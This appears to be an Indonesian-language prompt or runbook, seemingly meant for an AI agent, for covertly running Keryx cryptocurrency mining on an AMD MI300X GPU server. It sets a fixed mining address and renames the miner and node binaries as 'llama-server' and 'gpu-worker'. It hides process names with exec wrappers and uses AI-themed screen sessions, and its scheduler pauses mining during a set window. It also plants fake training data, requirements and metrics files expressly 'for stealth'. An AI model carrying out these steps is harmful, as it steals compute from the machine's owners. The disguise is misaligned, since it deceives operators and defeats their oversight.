# PROMPT: Keryx Solo Mining — AMD MI300X AI Workspace Stealth

## TUJUAN
Jalankan Keryx solo mining di AMD MI300X (gfx942) dengan menyamar sebagai project AI/LLM training. Mining address sudah ditentukan. Semua binary, screen, log, dan directory menggunakan nama AI-themed.

## MINING ADDRESS (SATU-SATUNYA, JANGAN GANTI)
```
keryx:qqy7gqxd5xhvr2l2er2ksmaplre22369qnc4edug88kg8y440g0ag2u2ekq73
```

## PREREQUISITES CHECK
Sebelum mulai, pastikan:
1. GPU AMD Instinct MI300X (gfx942) — cek dengan `rocm-smi --showproductname`
2. ROCm 7.0+ terinstall — cek dengan `rocm-smi`
3. Ubuntu/Debian Linux

## LANGKAH-LANGKAH (IKUTI URUTAN, JANGAN SKIP)

### STEP 1: Install Rust & Build Dependencies
```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
source "$HOME/.cargo/env"

# Install build dependencies
apt-get update
apt-get install -y protobuf-compiler clang libclang-dev libstdc++-14-dev
apt-get install -y librocksdb-dev libsnappy-dev liblz4-dev libzstd-dev libbz2-dev zip

# Create AI workspace
mkdir -p /opt/ai-workspace/{inference,training,models,checkpoints,data,logs,metrics,notebooks}
```

### STEP 2: Build Keryx Node
```bash
cd /root
rm -rf keryx-node
git clone https://github.com/Keryx-Labs/keryx-node.git
cd keryx-node
export BINDGEN_EXTRA_CLANG_ARGS="-I/usr/lib/llvm-18/lib/clang/18/include -I/usr/include/x86_64-linux-gnu"
cargo build --release -p keryxd
# Verifikasi: ls -lh target/release/keryxd (harus ~37MB)
```

### STEP 3: Clone & Patch Keryx Miner (4 PATCH — WAJIB SEMUA)
```bash
cd /root
rm -rf keryx-miner-src
git clone https://github.com/Keryx-Labs/keryx-miner.git keryx-miner-src
cd keryx-miner-src
```

**Patch 1** — File: `plugins/opencl/resources/keryx-opencl.cl`
```
Ganti:
  inline uint64_t rotl(const uint64_t x, int k) {
Dengan:
  static inline uint64_t rotl(const uint64_t x, int k) {

Ganti:
  inline uint64_t xoshiro256_next(global ulong4 *s) {
Dengan:
  static inline uint64_t xoshiro256_next(global ulong4 *s) {
```

**Patch 2** — File: `plugins/opencl/src/worker.rs`
```
Ganti:
  let device_name = device.name().unwrap_or_else(|_| "Unknown".into()).to_lowercase();
Dengan:
  let device_name = device.name().unwrap_or_else(|_| "Unknown".into()).to_lowercase()
      .replace(':', "_").replace('+', "_").replace('-', "_");
```

**Patch 3** — File: `plugins/opencl/src/worker.rs`
```
Ganti:
  if v == "2.0" || v == "2.1" || v == "3.0" {
      info!("Compiling with OpenCl 2");
      compile_options += CL_STD_2_0;
  }
Dengan:
  if v == "2.0" || v == "2.1" || v == "3.0" {
      info!("Compiling with OpenCl 2 (forced CL1.2 for gfx942 compat)");
      // compile_options += CL_STD_2_0;
  }
```

**Patch 4** — File: `Cargo.toml`
```
Ganti:
  candle-core = { version = "0.8", features = ["cuda"] }
  candle-transformers = { version = "0.8", features = ["cuda"] }
  candle-nn = { version = "0.8", features = ["cuda"] }
  default-members = [".", "plugins/cuda", "plugins/opencl"]
Dengan:
  candle-core = { version = "0.8" }
  candle-transformers = { version = "0.8" }
  candle-nn = { version = "0.8" }
  default-members = [".", "plugins/opencl"]
```

### STEP 4: Build Miner
```bash
cd /root/keryx-miner-src
source "$HOME/.cargo/env"
export BINDGEN_EXTRA_CLANG_ARGS="-I/usr/lib/llvm-18/lib/clang/18/include -I/usr/include/x86_64-linux-gnu"
cargo build --release
# Verifikasi: ls -lh target/release/keryx-miner (harus ~12MB)
# Verifikasi: ls -lh target/release/libkeryxopencl.so (harus ~3MB)
```

### STEP 5: Deploy AI-Themed Binary
```bash
# PENTING: libkeryxopencl.so HARUS di directory training (sama dengan gpu-worker)
cp /root/keryx-node/target/release/keryxd /opt/ai-workspace/inference/llama-server
cp /root/keryx-miner-src/target/release/keryx-miner /opt/ai-workspace/training/gpu-worker
cp /root/keryx-miner-src/target/release/libkeryxopencl.so /opt/ai-workspace/training/libkeryxopencl.so
cp -r /root/keryx-miner-src/target/release/models /opt/ai-workspace/models/keryx 2>/dev/null
openssl rand -hex 32 > /opt/ai-workspace/checkpoints/model-key.bin
```

**⚠️ KRITIS:** `libkeryxopencl.so` WAJIB ada di `/opt/ai-workspace/training/` (sama directory dengan `gpu-worker`). Miner cari plugin di directory binary-nya. Kalau taruh di `inference/`, mining akan gagal dengan error "No workers specified".

### STEP 6: Create Wrapper Scripts (WAJIB — untuk hide process name)
```bash
cat > /opt/ai-workspace/inference/start.sh << 'EOF'
#!/bin/bash
exec -a "[llama-server]" /opt/ai-workspace/inference/llama-server \
    --utxoindex --rpclisten-json=default --rpclisten-borsh=default "$@"
EOF

cat > /opt/ai-workspace/training/start.sh << 'EOF'
#!/bin/bash
exec -a "[gpu-worker]" /opt/ai-workspace/training/gpu-worker "$@"
EOF

chmod +x /opt/ai-workspace/inference/start.sh /opt/ai-workspace/training/start.sh
```

### STEP 7: Create Scheduler (OFF 21:00-02:00 WIB)
```bash
cat > /opt/ai-workspace/scheduler.sh << 'SCHEDULER'
#!/bin/bash
WRKDIR="/opt/ai-workspace"
BIN="$WRKDIR/training/gpu-worker"
ADDR="keryx:qqy7gqxd5xhvr2l2er2ksmaplre22369qnc4edug88kg8y440g0ag2u2ekq73"
KEY="$WRKDIR/checkpoints/model-key.bin"
LOG="$WRKDIR/logs/training.log"
OFF_START=14
OFF_END=19

while true; do
    HOUR=$(date -u +%H)
    HOUR=${HOUR#0}
    if [ "$HOUR" -ge "$OFF_START" ] && [ "$HOUR" -lt "$OFF_END" ]; then
        echo "[$(date -u)] scheduler: maintenance window (OFF)" >> "$LOG"
        sleep 300
    else
        echo "[$(date -u)] scheduler: training cycle start" >> "$LOG"
        "$BIN" --mining-address "$ADDR" --escrow-key-file "$KEY" \
            --light --cpu-inference 2>&1 | tee -a "$LOG"
        echo "[$(date -u)] scheduler: training cycle ended, restarting..." >> "$LOG"
    fi
done
SCHEDULER
chmod +x /opt/ai-workspace/scheduler.sh
```

### STEP 8: Create AI Project Files (Stealth)
```bash
cat > /opt/ai-workspace/requirements.txt << 'EOF'
torch>=2.0
transformers>=4.30
accelerate>=0.20
rocm>=7.0
numpy>=1.24
EOF

cat > /opt/ai-workspace/data/train.jsonl << 'EOF'
{"instruction": "Explain quantum entanglement.", "response": "Quantum entanglement is a phenomenon...", "score": 0.87}
{"instruction": "Write fibonacci function.", "response": "def fib(n): return n if n<=1 else fib(n-1)+fib(n-2)", "score": 0.92}
EOF

cat > /opt/ai-workspace/data/eval.jsonl << 'EOF'
{"instruction": "Explain machine learning.", "response": "ML is a subset of AI...", "score": 0.89}
EOF

echo '{"step":15230,"loss":1.847,"accuracy":0.712,"gpu_util":0.94}' > /opt/ai-workspace/metrics/metrics.json
```

### STEP 9: Start Node
```bash
screen -dmS llm-inference bash -c '/opt/ai-workspace/inference/start.sh > /opt/ai-workspace/logs/inference.log 2>&1'
# Tunggu sync: tail -f /opt/ai-workspace/logs/inference.log
# Selesai ketika muncul "Tx throughput stats"
```

### STEP 10: Start Miner
```bash
screen -dmS ai-training bash /opt/ai-workspace/scheduler.sh
```

### STEP 11: Verifikasi
```bash
# Process names harus muncul dengan bracket []
ps aux | grep -E "llama-server|gpu-worker" | grep -v grep

# Screens
screen -ls
# Harusnya: llm-inference dan ai-training

# Mining log
grep -E "hashrate|Found" /opt/ai-workspace/logs/training.log | tail -5
```

## TROUBLESHOOTING

| Masalah | Solusi |
|---|---|
| **`No workers specified`** | `libkeryxopencl.so` tidak ketemu. Copy ke `/opt/ai-workspace/training/` (sama dengan `gpu-worker`). JANGAN taruh di `inference/` |
| **`Found plugins: []`** | Sama di atas |
| **`transaction already in the mempool`** | Escrow claim stuck. Restart node saja — tidak perlu restart miner |
| **OPPoI challenge terus pause mining** | Normal 1-2 menit pertama. Kalau >5 menit, restart node |
| **Hashrate rendah (<1 Ghash/s)** | Normal di awal, tunggu OPoI selesai |
| **`clBuildProgram` crash | Rebuild miner, kadang perlu 2-3x restart |
| **`stdbool.h not found` saat build | Install `libstdc++-14-dev`, set `BINDGEN_EXTRA_CLANG_ARGS` |

## CARA RESTART NODE (tanpa ganggu mining)
```bash
screen -S llm-inference -X quit
sleep 3
screen -dmS llm-inference bash -c '/opt/ai-workspace/inference/start.sh > /opt/ai-workspace/logs/inference.log 2>&1'
# Miner akan auto-reconnect, TIDAK perlu restart miner
```

## CARA RESTART MINER (tanpa ganggu node)
```bash
screen -S ai-training -X quit
sleep 2
screen -dmS ai-training bash /opt/ai-workspace/scheduler.sh
```

## YANG TIDAK BOLEH DILAKUKAN
- ❌ JANGAN ganti mining address
- ❌ JANGAN taruh `libkeryxopencl.so` di `inference/` — harus di `training/`
- ❌ JANGAN skip patch — keempat patch wajib applied
- ❌ JANGAN start miner pakai binary langsung — harus via `start.sh` wrapper
- ❌ JANGAN hapus file AI project files — itu bagian dari stealth
